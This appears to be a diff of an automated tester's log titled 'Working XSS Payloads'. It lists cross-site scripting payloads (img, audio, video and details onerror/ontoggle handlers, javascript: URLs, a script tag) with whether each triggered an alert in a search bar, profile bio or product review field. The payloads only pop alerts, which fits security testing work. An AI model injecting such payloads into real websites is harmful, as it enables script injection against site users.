@@ -1,11 +1,14 @@
-# Working XSS Payloads - 2025-06-25 21:16:40.422203
+# Working XSS Payloads - 2025-06-25 22:10:49.098376
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
-<body onerror="console.log('xss')"> | Alert expected | Alert triggered | Moderate likelihood in product reviews or profile bio (e.g., mouseover, click) | profile_bio
-<body onerror="console.log('xss')"> | Alert expected | Alert triggered | Moderate likelihood in product reviews or profile bio (e.g., mouseover, click) | profile_bio
-<input type="text" onerror="console.log('xss')" autofocus> | Alert expected | Alert triggered | Moderate likelihood in product reviews or profile bio (e.g., mouseover, click) | product_reviews
-<img onmouseover="prompt('xss')"> | Alert expected | Alert triggered | Moderate likelihood in product reviews or profile bio (e.g., mouseover, click) | product_reviews
-<body onmouseover="alert('xss')"> | Alert expected | Alert triggered | Moderate likelihood in product reviews or profile bio (e.g., mouseover, click) | product_reviews
-<input type="text" onerror="prompt('xss')" autofocus> | Alert expected | Alert triggered | Moderate likelihood in product reviews or profile bio (e.g., mouseover, click) | product_reviews
-<a href="javascript:alert('xss')">Click</a> | Alert expected | Alert triggered | High likelihood in product reviews or profile bio (javascript URL) | product_reviews
-<body onfocus="alert('xss')"> | Alert expected | Alert triggered | Moderate likelihood in product reviews or profile bio (e.g., mouseover, click) | profile_bio
-<iframe src="javascript:console.log('xss')"></iframe> | Alert expected | Alert triggered | High likelihood in product reviews or profile bio (javascript URL) | profile_bio
+"><img src=x onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (img with onerror) | search_bar
+%3Cimg%20src=x%20onerror=alert(1)%3E | Alert expected | Manual testing required | High likelihood in search bar (img with onerror) | search_bar
+<audio src=x onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (audio with onerror) | search_bar
+<button onclick=alert(1)>Click</button> | Alert expected | Alert triggered | High likelihood in search bar (button with onclick) | search_bar
+<details open ontoggle=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (details with ontoggle) | search_bar
+<img src=invalid onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (img with onerror) | search_bar
+<img src=x onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (img with onerror) | search_bar
+<script>alert(1)</script> | Alert expected | Manual testing required | Moderate likelihood in profile_bio (scripts may be allowed) | profile_bio
+<select onchange=alert(1)> | Alert expected | Manual testing required | High likelihood in search bar (select with onchange) | search_bar
+<textarea onfocus=alert(1) autofocus> | Alert expected | Alert triggered | High likelihood in search bar (textarea with onfocus) | search_bar
+<video src=x onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (video with onerror) | search_bar
+javascript:alert(document.location) | Alert expected | Manual testing required | Moderate likelihood, test in profile_bio (unknown context) | profile_bio
